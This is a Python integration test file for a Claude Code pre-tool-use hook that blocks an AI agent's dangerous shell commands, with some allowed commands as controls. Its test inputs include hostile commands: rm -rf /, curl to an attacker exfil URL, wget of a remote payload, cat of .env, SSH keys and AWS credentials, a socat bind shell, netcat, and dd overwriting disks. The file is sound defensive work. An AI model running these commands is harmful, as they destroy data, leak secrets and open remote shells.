"""tests/integration/test_deny_dangerous_commands.py — pre_tool_use.sh deny 清单集成测试 (T014)

结论：测试 pre_tool_use.sh 的完整 deny 清单（≥15 test），对应 SLA §1.4 安全承诺。
      每条 deny 模式至少 1 个 test；同时含 1-2 个 allow 样例验证不误杀。

对齐：T014.md §Outputs + architecture.md §6 deny 清单 + SLA §1.4
"""

from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path

import pytest

# ---------------------------------------------------------------------------
# 常量
# ---------------------------------------------------------------------------

# 项目根目录（包含 pars/）
_PROJECT_ROOT = Path(__file__).parent.parent.parent

# hook 路径（T014 file_domain）
_HOOK_PATH = _PROJECT_ROOT / "worker_claude_dir" / "hooks" / "pre_tool_use.sh"


def _make_input_json(command: str, tool_name: str = "Bash") -> str:
    """构造符合 Claude Code hook 协议的 stdin JSON。

    协议格式：{"tool": {"name": "<ToolName>"}, "input": {"command": "<bash cmd>"}}
    """
    return json.dumps({"tool": {"name": tool_name}, "input": {"command": command}})


def _run_hook(
    cmd_str: str, tool_name: str = "Bash"
) -> subprocess.CompletedProcess[str]:
    """运行 pre_tool_use.sh hook，返回 CompletedProcess。

    exit 0 = allow，exit 2 = deny。
    """
    env = {**os.environ, "PYTHONPATH": str(_PROJECT_ROOT)}
    return subprocess.run(
        ["bash", str(_HOOK_PATH)],
        input=_make_input_json(cmd_str, tool_name),
        capture_output=True,
        text=True,
        env=env,
        cwd=str(_PROJECT_ROOT),
        check=False,
    )


# ---------------------------------------------------------------------------
# 前提：hook 文件存在且语法正确
# ---------------------------------------------------------------------------


@pytest.mark.integration
def test_hook_file_exists_and_has_valid_bash_syntax() -> None:
    """should pass bash -n syntax check on pre_tool_use.sh."""
    assert _HOOK_PATH.exists(), f"hook 文件不存在：{_HOOK_PATH}"
    result = subprocess.run(
        ["bash", "-n", str(_HOOK_PATH)],
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode == 0, f"bash 语法检查失败：{result.stderr}"


# ===========================================================================
# Deny 组 1：rm -rf 变体（architecture §6 · SLA §1.4 第4条）
# ===========================================================================


@pytest.mark.integration
def test_deny_rm_rf_root() -> None:
    """should deny rm -rf / (危险递归删除根目录)."""
    result = _run_hook("rm -rf /")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_rm_rf_arbitrary_path() -> None:
    """should deny rm -rf on arbitrary path (e.g. /tmp/data)."""
    result = _run_hook("rm -rf /tmp/data")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_rm_fr_variant() -> None:
    """should deny rm -fr variant (flags 顺序颠倒)."""
    result = _run_hook("rm -fr /some/dir")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_rm_r_f_separated_flags() -> None:
    """should deny rm -r -f separated flags variant."""
    result = _run_hook("rm -r -f /important")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


# ===========================================================================
# Deny 组 2：curl/wget/httpie 外部请求（allow localhost，deny 外部）
# ===========================================================================


@pytest.mark.integration
def test_deny_curl_external() -> None:
    """should deny curl to external host (e.g. example.com)."""
    result = _run_hook("curl http://example.com/data")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_curl_external_https() -> None:
    """should deny curl to external HTTPS host."""
    result = _run_hook("curl https://api.attacker.com/exfil")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_wget_external() -> None:
    """should deny wget to external host."""
    result = _run_hook("wget https://malicious.example.org/payload.sh")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


# ===========================================================================
# Deny 组 3：cat 敏感文件（.env / .key / .pem / ~/.aws/*）
# ===========================================================================


@pytest.mark.integration
def test_deny_cat_env() -> None:
    """should deny cat .env (凭证文件泄露)."""
    result = _run_hook("cat .env")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_cat_key_file() -> None:
    """should deny cat private.key file."""
    result = _run_hook("cat ~/.ssh/id_rsa.key")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_cat_pem_file() -> None:
    """should deny cat certificate.pem file."""
    result = _run_hook("cat /etc/ssl/private/server.pem")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_cat_aws_credentials() -> None:
    """should deny cat ~/.aws/credentials."""
    result = _run_hook("cat ~/.aws/credentials")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


# ===========================================================================
# Deny 组 4：权限修改（chmod / chflags / chattr）
# ===========================================================================


@pytest.mark.integration
def test_deny_chmod() -> None:
    """should deny chmod to prevent bypassing readonly protection."""
    result = _run_hook("chmod 777 /etc/passwd")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_chflags() -> None:
    """should deny chflags (macOS immutable flag 修改)."""
    result = _run_hook("chflags nouchg .claude/settings.json")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_chattr() -> None:
    """should deny chattr (Linux immutable flag 修改)."""
    result = _run_hook("chattr -i /important/file")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


# ===========================================================================
# Deny 组 5：提权（sudo / su -）
# ===========================================================================


@pytest.mark.integration
def test_deny_sudo() -> None:
    """should deny sudo (提权命令)."""
    result = _run_hook("sudo rm -rf /var/log")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_su_dash() -> None:
    """should deny su - (切换 root)."""
    result = _run_hook("su - root")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


# ===========================================================================
# Deny 组 6：ssh / scp / rsync 外部地址
# ===========================================================================


@pytest.mark.integration
def test_deny_ssh_external() -> None:
    """should deny ssh to external host."""
    result = _run_hook("ssh user@remote.example.com")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_scp_external() -> None:
    """should deny scp to external host."""
    result = _run_hook("scp data.tar.gz user@h200.cloud:/remote/")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_rsync_external() -> None:
    """should deny rsync to external host."""
    result = _run_hook("rsync -av runs/ user@h200:/remote/runs/")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


# ===========================================================================
# Deny 组 7：网络工具（nc / netcat / socat）
# ===========================================================================


@pytest.mark.integration
def test_deny_nc_netcat() -> None:
    """should deny nc (netcat) command."""
    result = _run_hook("nc -l 4444")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_netcat() -> None:
    """should deny netcat command."""
    result = _run_hook("netcat attacker.com 4444")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_socat() -> None:
    """should deny socat (socket relay tool)."""
    result = _run_hook("socat TCP-LISTEN:4444,fork EXEC:/bin/bash")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


# ===========================================================================
# Deny 组 8：dd 危险写操作
# ===========================================================================


@pytest.mark.integration
def test_deny_dd_write_to_block_device() -> None:
    """should deny dd if=/dev/random of=/dev/sda (覆写块设备)."""
    result = _run_hook("dd if=/dev/random of=/dev/sda")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_deny_dd_urandom_to_disk() -> None:
    """should deny dd if=/dev/urandom of=/dev/sdb bs=1M."""
    result = _run_hook("dd if=/dev/urandom of=/dev/sdb bs=1M")
    assert result.returncode == 2, (
        f"期望 exit 2 (deny)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


# ===========================================================================
# Allow 样例：确认不误杀合法命令
# ===========================================================================


@pytest.mark.integration
def test_allow_cat_config_yaml() -> None:
    """should allow cat config.yaml (普通配置文件读取)."""
    result = _run_hook("cat config.yaml")
    assert result.returncode == 0, (
        f"期望 exit 0 (allow)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_allow_curl_localhost() -> None:
    """should allow curl http://localhost:4000 (本地 proxy 通信)."""
    result = _run_hook("curl http://localhost:4000/v1/messages")
    assert result.returncode == 0, (
        f"期望 exit 0 (allow)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_allow_curl_127_0_0_1() -> None:
    """should allow curl http://127.0.0.1:PORT (本地 proxy 通信)."""
    result = _run_hook("curl http://127.0.0.1:8080/v1/messages")
    assert result.returncode == 0, (
        f"期望 exit 0 (allow)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_allow_ls() -> None:
    """should allow ls -la (目录列表，无害)."""
    result = _run_hook("ls -la")
    assert result.returncode == 0, (
        f"期望 exit 0 (allow)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_allow_python_script() -> None:
    """should allow python train.py (训练脚本执行)."""
    result = _run_hook("python train.py --epochs 3 --lr 1e-4")
    assert result.returncode == 0, (
        f"期望 exit 0 (allow)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


@pytest.mark.integration
def test_allow_echo_hello() -> None:
    """should allow echo hello (无害输出)."""
    result = _run_hook("echo hello world")
    assert result.returncode == 0, (
        f"期望 exit 0 (allow)，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )


# ===========================================================================
# deny 消息验证：stderr 包含命令内容
# ===========================================================================


@pytest.mark.integration
def test_deny_message_contains_reason_in_stderr() -> None:
    """should log DENY reason with command to stderr on denial."""
    result = _run_hook("rm -rf /important")
    assert result.returncode == 2
    assert "DENY" in result.stderr or "deny" in result.stderr.lower(), (
        f"deny 消息应出现在 stderr，实际：{result.stderr!r}"
    )


@pytest.mark.integration
def test_non_bash_tool_is_allowed() -> None:
    """should allow non-Bash tool (e.g. Read) without command inspection."""
    result = _run_hook(".env", tool_name="Read")
    assert result.returncode == 0, (
        f"非 Bash 工具应直接 allow，实际 exit {result.returncode}\nstderr: {result.stderr}"
    )
